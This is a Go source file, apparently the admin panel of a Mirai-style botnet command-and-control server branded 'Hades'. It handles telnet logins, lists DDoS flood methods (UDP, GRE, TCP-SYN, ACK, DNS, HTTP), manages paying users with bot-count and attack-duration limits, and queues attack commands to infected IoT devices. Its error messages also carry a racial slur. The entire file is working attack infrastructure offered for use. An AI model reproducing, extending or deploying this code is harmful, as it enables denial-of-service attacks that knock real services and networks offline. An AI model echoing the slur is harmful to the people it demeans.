package main

import (
    "fmt"
    "net"
    "time"
    "strings"
    "strconv"
)

type Admin struct {
    conn    net.Conn
}

func NewAdmin(conn net.Conn) *Admin {
    return &Admin{conn}
}

func (this *Admin) Handle() {
    this.conn.Write([]byte("\033[?1049h"))
    this.conn.Write([]byte("\xFF\xFB\x01\xFF\xFB\x03\xFF\xFC\x22"))

    defer func() {
        this.conn.Write([]byte("\033[?1049l"))
    }()

    this.conn.SetDeadline(time.Now().Add(60 * time.Second))
    this.conn.Write([]byte("\x1b[90m𝖀𝖘𝖊𝖗𝖓𝖆𝖒𝖊\x1b[31m: "))
    username, err := this.ReadLine(false)
    if err != nil {
        return
    }

    this.conn.SetDeadline(time.Now().Add(60 * time.Second))
    this.conn.Write([]byte("\x1b[90m𝕻𝖆𝖘𝖘𝖜𝖔𝖗𝖉\x1b[31m: "))
    password, err := this.ReadLine(true)
    if err != nil {
        return
    }

    this.conn.SetDeadline(time.Now().Add(120 * time.Second))

    var loggedIn bool
    var userInfo AccountInfo
    if loggedIn, userInfo = database.TryLogin(username, password, this.conn.RemoteAddr()); !loggedIn {
        this.conn.Write([]byte("\033[2J\033[1H"))
        this.conn.Write([]byte("\r\x1b[31mIncorrect data!\r\n"))
        this.conn.Write([]byte("\x1b[31mPress any shit to exit."))
        buf := make([]byte, 1)
        this.conn.Read(buf)
        return
    }

    this.conn.Write([]byte("\033[2J\033[1H"))
    this.conn.Write([]byte("\x1b[90m                \r\n"))
    this.conn.Write([]byte("\x1b[31m                                           ..                     .x+=:.                  \r\n"))
    this.conn.Write([]byte("\x1b[31m                  .uef^                 dF                      z`    ^%                  \r\n"))
    this.conn.Write([]byte("\x1b[31m                :d88E                   '88bu.                      .   <k                \r\n"))
    this.conn.Write([]byte("\x1b[31m                `888E             u     '*88888bu        .u       .@8Ned8                 \r\n"))
    this.conn.Write([]byte("\x1b[31m                 888E .z8k     us888u.    ^*8888N    ud8888.   .@^%8888                   \r\n"))
    this.conn.Write([]byte("\x1b[31m                 888E~?888L .@88  8888   beWE  888L :888 8888. x88:  `)8b.                \r\n"))
    this.conn.Write([]byte("\x1b[31m                 888E  888E 9888  9888   888E  888E d888 '88%  8888N=*8888                \r\n"))
    this.conn.Write([]byte("\x1b[31m                 888E  888E 9888  9888   888E  888E 8888.+      %8     R88                \r\n"))
    this.conn.Write([]byte("\x1b[31m                 888E  888E 9888  9888   888E  888F 8888L        @8Wou 9%                 \r\n"))
    this.conn.Write([]byte("\x1b[31m                 888E  888E 9888  9888  .888N..888  '8888c. .+ .888888P`                  \r\n"))
    this.conn.Write([]byte("\x1b[31m                m888N= 888>  888*  888   `888*       88888%   `   ^F                      \r\n"))
    this.conn.Write([]byte("\x1b[31m                 `Y    888   ^Y    ^Y        ^          YP'                               \r\n"))
    this.conn.Write([]byte("\x1b[31m                     J88                                                                  \r\n"))
    this.conn.Write([]byte("\x1b[31m                      @%                                                                  \r\n"))
    this.conn.Write([]byte("\x1b[31m                    :'                                                                    \r\n"))
    this.conn.Write([]byte("\x1b[90m                \r\n"))
    this.conn.Write([]byte("\x1b[90m                      𝕿𝖍𝖊 𝖈𝖑𝖔𝖘𝖊𝖗 𝖞𝖔𝖚 𝖆𝖗𝖊 𝖙𝖔 𝖉𝖊𝖆𝖙𝖍, 𝖙𝖍𝖊 𝖒𝖔𝖗𝖊 𝖆𝖑𝖎𝖛𝖊 𝖞𝖔𝖚 𝖋𝖊𝖊𝖑.       \r\n"))
    this.conn.Write([]byte("\x1b[90m                                       @𝖘𝖆𝖙𝖚𝖚𝖗.𝖓𝖊𝖙𝖟                           \r\n"))
    this.conn.Write([]byte("\x1b[90m                \r\n"))

    go func() {
        i := 0
        for {
            var BotCount int
            if clientList.Count() > userInfo.maxBots && userInfo.maxBots != -1 {
                BotCount = userInfo.maxBots
            } else {
                BotCount = clientList.Count()
            }

            time.Sleep(time.Second)
            if _, err := this.conn.Write([]byte(fmt.Sprintf("\033]0;%d IoT Devices | %s\007", BotCount, username))); err != nil {
                this.conn.Close()
                break
            }
            i++
            if i % 60 == 0 {
                this.conn.SetDeadline(time.Now().Add(120 * time.Second))
            }
        }
    }()

    for {
        var botCatagory string
        var botCount int
        botCount = clientList.Count()
        this.conn.Write([]byte("\x1b[31m"+username+"\x1b[90m@\x1b[31m𝕳𝖆𝖉𝖊𝖘\x1b[90m #:\033[0m "))
        cmd, err := this.ReadLine(false)
        if err != nil || cmd == "exit" || cmd == "quit" {
            return
        }
        if cmd == "" {
            continue
        }
		if err != nil || cmd == "cls" || cmd == "clear" {
    this.conn.Write([]byte("\033[2J\033[1H"))
    this.conn.Write([]byte("\x1b[90m                \r\n"))
    this.conn.Write([]byte("\x1b[31m                                           ..                     .x+=:.                  \r\n"))
    this.conn.Write([]byte("\x1b[31m                  .uef^                 dF                      z`    ^%                  \r\n"))
    this.conn.Write([]byte("\x1b[31m                :d88E                   '88bu.                      .   <k                \r\n"))
    this.conn.Write([]byte("\x1b[31m                `888E             u     '*88888bu        .u       .@8Ned8                 \r\n"))
    this.conn.Write([]byte("\x1b[31m                 888E .z8k     us888u.    ^*8888N    ud8888.   .@^%8888                   \r\n"))
    this.conn.Write([]byte("\x1b[31m                 888E~?888L .@88  8888   beWE  888L :888 8888. x88:  `)8b.                \r\n"))
    this.conn.Write([]byte("\x1b[31m                 888E  888E 9888  9888   888E  888E d888 '88%  8888N=*8888                \r\n"))
    this.conn.Write([]byte("\x1b[31m                 888E  888E 9888  9888   888E  888E 8888.+      %8     R88                \r\n"))
    this.conn.Write([]byte("\x1b[31m                 888E  888E 9888  9888   888E  888F 8888L        @8Wou 9%                 \r\n"))
    this.conn.Write([]byte("\x1b[31m                 888E  888E 9888  9888  .888N..888  '8888c. .+ .888888P`                  \r\n"))
    this.conn.Write([]byte("\x1b[31m                m888N= 888>  888*  888   `888*       88888%   `   ^F                      \r\n"))
    this.conn.Write([]byte("\x1b[31m                 `Y    888   ^Y    ^Y        ^          YP'                               \r\n"))
    this.conn.Write([]byte("\x1b[31m                     J88                                                                  \r\n"))
    this.conn.Write([]byte("\x1b[31m                      @%                                                                  \r\n"))
    this.conn.Write([]byte("\x1b[31m                    :'                                                                    \r\n"))
    this.conn.Write([]byte("\x1b[90m                \r\n"))
    this.conn.Write([]byte("\x1b[90m                      𝕿𝖍𝖊 𝖈𝖑𝖔𝖘𝖊𝖗 𝖞𝖔𝖚 𝖆𝖗𝖊 𝖙𝖔 𝖉𝖊𝖆𝖙𝖍, 𝖙𝖍𝖊 𝖒𝖔𝖗𝖊 𝖆𝖑𝖎𝖛𝖊 𝖞𝖔𝖚 𝖋𝖊𝖊𝖑.       \r\n"))
    this.conn.Write([]byte("\x1b[90m                                       @𝖘𝖆𝖙𝖚𝖚𝖗.𝖓𝖊𝖙𝖟                           \r\n"))
    this.conn.Write([]byte("\x1b[90m                \r\n"))
			continue
		}

        //if err != nil || cmd == "l7" || cmd == "L7" {
        //    this.conn.Write([]byte("\x1b[90m╭──────────────────╯ \x1b[31m• \x1b[90m╰───────────────────────╮\r\n"))
        //    this.conn.Write([]byte("\x1b[90m \x1b[97mLayer7 Based Methods \x1b[97m:\x1b[90m-                   \x1b[90m\r\n"))
        //    this.conn.Write([]byte("\x1b[90m                \r\n"))
        //    this.conn.Write([]byte("\x1b[90m \x1b[97m.http   \x1b[90m├─ \x1b[97m⚬ \x1b[31mHTTP GHP Flood.     \x1b[90m\r\n"))                     
        //    this.conn.Write([]byte("\x1b[90m╰──────────────────╮ \x1b[31m• \x1b[90m╭───────────────────────╯\r\n"))
        //    continue
        //}

        if err != nil || cmd == "METHODS" || cmd == "methods" {
            this.conn.Write([]byte("\x1b[90m╭──────────────────╯ \x1b[31m• \x1b[90m╰───────────────────────╮\r\n"))
            this.conn.Write([]byte("\x1b[90m \x1b[97m.udpraw   \x1b[90m├─ \x1b[97m⚬ \x1b[31mUDP-RAW Flood.     \x1b[90m\r\n"))
            this.conn.Write([]byte("\x1b[90m \x1b[97m.stdhex   \x1b[90m├─ \x1b[97m⚬ \x1b[31mSTD-HEX Flood.     \x1b[90m\r\n"))              
            this.conn.Write([]byte("\x1b[90m \x1b[97m.greip    \x1b[90m├─ \x1b[97m⚬ \x1b[31mGRE-IP Flood.      \x1b[90m\r\n")) 
            this.conn.Write([]byte("\x1b[90m \x1b[97m.greeth   \x1b[90m├─ \x1b[97m⚬ \x1b[31mGRE-ETH Flood.     \x1b[90m\r\n"))
            this.conn.Write([]byte("\x1b[90m \x1b[97m.udprand  \x1b[90m├─ \x1b[97m⚬ \x1b[31mUDP-RAND Flood.    \x1b[90m\r\n"))              
            this.conn.Write([]byte("\x1b[90m \x1b[97m.tcp      \x1b[90m├─ \x1b[97m⚬ \x1b[31mTCP Flood.         \x1b[90m\r\n"))       
            this.conn.Write([]byte("\x1b[90m \x1b[97m.ack      \x1b[90m├─ \x1b[97m⚬ \x1b[31mTCP-ACK Flood.     \x1b[90m\r\n"))   
            this.conn.Write([]byte("\x1b[90m \x1b[97m.syn      \x1b[90m├─ \x1b[97m⚬ \x1b[31mTCP-SYN Flood.     \x1b[90m\r\n"))             
            this.conn.Write([]byte("\x1b[90m \x1b[97m.storm    \x1b[90m├─ \x1b[97m⚬ \x1b[31mTCP-ACK+PSH Flood.     \x1b[90m\r\n"))   
            this.conn.Write([]byte("\x1b[90m \x1b[97m.dns      \x1b[90m├─ \x1b[97m⚬ \x1b[31mUDP-DNS Flood.     \x1b[90m\r\n"))             
            this.conn.Write([]byte("\x1b[90m \x1b[97m.http     \x1b[90m├─ \x1b[97m⚬ \x1b[31mHTTP Flood.     \x1b[90m\r\n"))                     
            this.conn.Write([]byte("\x1b[90m╰──────────────────╮ \x1b[31m• \x1b[90m╭───────────────────────╯\r\n"))
            continue
        }

        if err != nil || cmd == "HELP" || cmd == "help" {
            this.conn.Write([]byte("\x1b[90m╭──────────────────╯ \x1b[31m• \x1b[90m╰──────────────────╮\r\n"))
            this.conn.Write([]byte("\x1b[90m \x1b[97mADMIN      \x1b[90m├─ \x1b[97m⚬ \x1b[31mShow ADMIN commands. (You must be an Admin)  \x1b[90m\r\n"))
            this.conn.Write([]byte("\x1b[90m \x1b[97mMETHODS    \x1b[90m├─ \x1b[97m⚬ \x1b[31mShow all current METHODS.    \x1b[90m\r\n"))             
            this.conn.Write([]byte("\x1b[90m \x1b[97mBOTS       \x1b[90m├─ \x1b[97m⚬ \x1b[31mShow all BOTS (You must be an Admin).       \x1b[90m\r\n"))       
            this.conn.Write([]byte("\x1b[90m \x1b[97mRULES      \x1b[90m├─ \x1b[97m⚬ \x1b[31mShow RULES.       \x1b[90m\r\n"))         
            this.conn.Write([]byte("\x1b[90m╰──────────────────╮ \x1b[31m• \x1b[90m╭──────────────────╯\r\n"))
            continue
        }

        if err != nil || userInfo.admin == 1 && cmd == "ADMIN" || cmd == "admin" {
            this.conn.Write([]byte("\x1b[90m╭──────────────────╯ \x1b[31m• \x1b[90m╰──────────────────╮\r\n"))
            this.conn.Write([]byte("\x1b[90m \x1b[97madduser     \x1b[90m├─ \x1b[97m⚬ \x1b[31mAdd a Normal user.  \x1b[90m\r\n"))
            this.conn.Write([]byte("\x1b[90m \x1b[97maddadmin    \x1b[90m├─ \x1b[97m⚬ \x1b[31mAdd a Admin user.   \x1b[90m\r\n"))              
            this.conn.Write([]byte("\x1b[90m \x1b[97mdeleteuser  \x1b[90m├─ \x1b[97m⚬ \x1b[31mRemove a user.      \x1b[90m\r\n"))              
            this.conn.Write([]byte("\x1b[90m╰──────────────────╮ \x1b[31m• \x1b[90m╭──────────────────╯\r\n"))
            continue
        }

        if err != nil || cmd == "RULES" || cmd == "rules" {
            this.conn.Write([]byte("\x1b[90m╭──────────────────╯ \x1b[31m• \x1b[90m╰──────────────────╮\r\n"))
            this.conn.Write([]byte("\x1b[90m \x1b[97mSharing USER             \x1b[90m├─ \x1b[97m= \x1b[31mPERMABAN.   \x1b[90m\r\n"))
            this.conn.Write([]byte("\x1b[90m \x1b[97mSpamming ATTACKS         \x1b[90m├─ \x1b[97m= \x1b[31mPERMABAN.   \x1b[90m\r\n"))              
            this.conn.Write([]byte("\x1b[90m \x1b[97mReselling without ADMIN  \x1b[90m├─ \x1b[97m= \x1b[31mPERMABAN.   \x1b[90m\r\n"))   
            this.conn.Write([]byte("\x1b[90m \x1b[97mAttacking GOV            \x1b[90m├─ \x1b[97m= \x1b[31mPERMABAN.   \x1b[90m\r\n"))            
            this.conn.Write([]byte("\x1b[90m╰──────────────────╮ \x1b[31m• \x1b[90m╭──────────────────╯\r\n"))
            continue
        }
        
        botCount = userInfo.maxBots

// addadmin

        if userInfo.admin == 1 && cmd == "addadmin" {
            this.conn.Write([]byte("Enter new nickname: "))
            new_un, err := this.ReadLine(false)
            if err != nil {
                return
            }
            this.conn.Write([]byte("Enter new password: "))
            new_pw, err := this.ReadLine(false)
            if err != nil {
                return
            }
            this.conn.Write([]byte("Max bots access (-1 for all bots): "))
            max_bots_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            max_bots, err := strconv.Atoi(max_bots_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\x1b[31m%s\033[0m\r\n", "Error to add max bots!")))
                continue
            }
            this.conn.Write([]byte("Max attack duration (-1 for unlimited): "))
            duration_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            duration, err := strconv.Atoi(duration_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\x1b[31m%s\033[0m\r\n", "Error to add max time!")))
                continue
            }
            this.conn.Write([]byte("Cooldown time (0 for no Cooldown): "))
            cooldown_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            cooldown, err := strconv.Atoi(cooldown_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\x1b[31m%s\033[0m\r\n", "Error to add max Cooldown!")))
                continue
            }
            this.conn.Write([]byte("New ACC info: \r\nNickname: " + new_un + "\r\nPassword: " + new_pw + "\r\nMaxBots: " + max_bots_str + "\r\nAre you sure? (y/n) "))
            confirm, err := this.ReadLine(false)
            if err != nil {
                return
            }
            if confirm != "y" {
                continue
            }
            if !database.CreateAdmin(new_un, new_pw, max_bots, duration, cooldown) {
                this.conn.Write([]byte(fmt.Sprintf("\x1b[31m%s\033[0m\r\n", "Error to add user. My niggamon runs.")))
            } else {
                this.conn.Write([]byte("\x1b[31mAdmin added sucefully!\033[0m\r\n"))
            }
            continue
        }

// adduser

        if userInfo.admin == 1 && cmd == "adduser" {
            this.conn.Write([]byte("Enter new nickname: \r\n"))
            new_un, err := this.ReadLine(false)
            if err != nil {
                return
            }
            this.conn.Write([]byte("Enter new password: \r\n"))
            new_pw, err := this.ReadLine(false)
            if err != nil {
                return
            }
            this.conn.Write([]byte("Max bots access (-1 for all bots): "))
            max_bots_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            max_bots, err := strconv.Atoi(max_bots_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\x1b[31m%s\033[0m\r\n", "Error to add max bots!")))
                continue
            }
            this.conn.Write([]byte("Max attack duration (-1 for unlimited): "))
            duration_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            duration, err := strconv.Atoi(duration_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\x1b[31m%s\033[0m\r\n", "Error to add max time!")))
                continue
            }
            this.conn.Write([]byte("Cooldown time (0 for no Cooldown): "))
            cooldown_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            cooldown, err := strconv.Atoi(cooldown_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\x1b[31m%s\033[0m\r\n", "Error to add max Cooldown!")))
                continue
            }
            this.conn.Write([]byte("New account info: \r\nNickname: " + new_un + "\r\nPassword: " + new_pw + "\r\nMaxBots: " + max_bots_str + "\r\nAre you sure? (y/n)\r\n"))
            confirm, err := this.ReadLine(false)
            if err != nil {
                return
            }
            if confirm != "y" {
                continue
            }
            if !database.CreateUser(new_un, new_pw, max_bots, duration, cooldown) {
                this.conn.Write([]byte(fmt.Sprintf("\x1b[31m%s\033[0m\r\n", "Error to add user. My niggamon runs.")))
            } else {
                this.conn.Write([]byte("\x1b[31mUser added sucefully!\033[0m\r\n"))
            }
            continue
        }

// deleteuser

        if userInfo.admin == 1 && cmd == "deleteuser" {
            this.conn.Write([]byte("\033[31mUsername: \033[31m"))
            rm_un, err := this.ReadLine(false)
            if err != nil {
                return
             }
            this.conn.Write([]byte(" \033[31mYou want to delete " + rm_un + " from your Network ? "))
            confirm, err := this.ReadLine(false)
            if err != nil {
                return
            }
            if confirm != "y" {
                continue
            }
            if !database.DeleteUser(rm_un) {
            this.conn.Write([]byte(fmt.Sprintf("\033[31mUnable to delete users!\r\n")))
            } else {
                this.conn.Write([]byte("\033[31mUser removed with sucess!\r\n"))
            }
            continue
        }
        
		if userInfo.admin == 1 && cmd == "count" || userInfo.admin == 1 && cmd == "bots" {
			botCount = clientList.Count()
            m := clientList.Distribution()
            for k, v := range m {
                this.conn.Write([]byte(fmt.Sprintf("\x1b[31m%s: \x1b[31m%d\r\n", k, v)))
            }
            this.conn.Write([]byte(fmt.Sprintf("\x1b[31mTotal Bots: \x1b[31m%d\r\n", botCount)))
            continue
        }
		if userInfo.admin == 0 && cmd == "count" || userInfo.admin == 0 && cmd == "bots" {
			this.conn.Write([]byte(fmt.Sprintf("\x1b[90mSorry, you dont have admin!\033[0m\r\n")))
            continue
        }
        if cmd[0] == '-' {
            countSplit := strings.SplitN(cmd, " ", 2)
            count := countSplit[0][1:]
            botCount, err = strconv.Atoi(count)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("Fail to count the bots!\"%s\"\033[0m\r\n", count)))
                continue
            }
            if userInfo.maxBots != -1 && botCount > userInfo.maxBots {
                this.conn.Write([]byte(fmt.Sprintf("Oops! You putting the max than allowed.\033[0m\r\n")))
                continue
            }
            cmd = countSplit[1]
        }
        if cmd[0] == '@' {
            cataSplit := strings.SplitN(cmd, " ", 2)
            botCatagory = cataSplit[0][1:]
            cmd = cataSplit[1]
        }

        atk, err := NewAttack(cmd, userInfo.admin)
        if err != nil {
            this.conn.Write([]byte(fmt.Sprintf("%s\033[0m\r\n", err.Error())))
        } else {
            buf, err := atk.Build()
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("%s\033[0m\r\n", err.Error())))
            } else {
                if can, err := database.CanLaunchAttack(username, atk.Duration, cmd, botCount, 0); !can {
                    this.conn.Write([]byte(fmt.Sprintf("%s\033[0m\r\n", err.Error())))
                } else if !database.ContainsWhitelistedTargets(atk) {
                    clientList.QueueBuf(buf, botCount, botCatagory)
                } else {
                    fmt.Println("Attack BLOCKED by " + username + " To the whitelist prefix!")
                }
            }
        }
    }
}

func (this *Admin) ReadLine(masked bool) (string, error) {
    buf := make([]byte, 1024)
    bufPos := 0

    for {
        n, err := this.conn.Read(buf[bufPos:bufPos+1])
        if err != nil || n != 1 {
            return "", err
        }
        if buf[bufPos] == '\xFF' {
            n, err := this.conn.Read(buf[bufPos:bufPos+2])
            if err != nil || n != 2 {
                return "", err
            }
            bufPos--
        } else if buf[bufPos] == '\x7F' || buf[bufPos] == '\x08' {
            if bufPos > 0 {
                this.conn.Write([]byte(string(buf[bufPos])))
                bufPos--
            }
            bufPos--
        } else if buf[bufPos] == '\r' || buf[bufPos] == '\t' || buf[bufPos] == '\x09' {
            bufPos--
        } else if buf[bufPos] == '\n' || buf[bufPos] == '\x00' {
            this.conn.Write([]byte("\r\n"))
            return string(buf[:bufPos]), nil
        } else if buf[bufPos] == 0x03 {
            this.conn.Write([]byte("^C\r\n"))
            return "", nil
        } else {
            if buf[bufPos] == '\x1B' {
                buf[bufPos] = '^';
                this.conn.Write([]byte(string(buf[bufPos])))
                bufPos++;
                buf[bufPos] = '[';
                this.conn.Write([]byte(string(buf[bufPos])))
            } else if masked {
                this.conn.Write([]byte("*"))
            } else {
                this.conn.Write([]byte(string(buf[bufPos])))
            }
        }
        bufPos++
    }
    return string(buf), nil
}
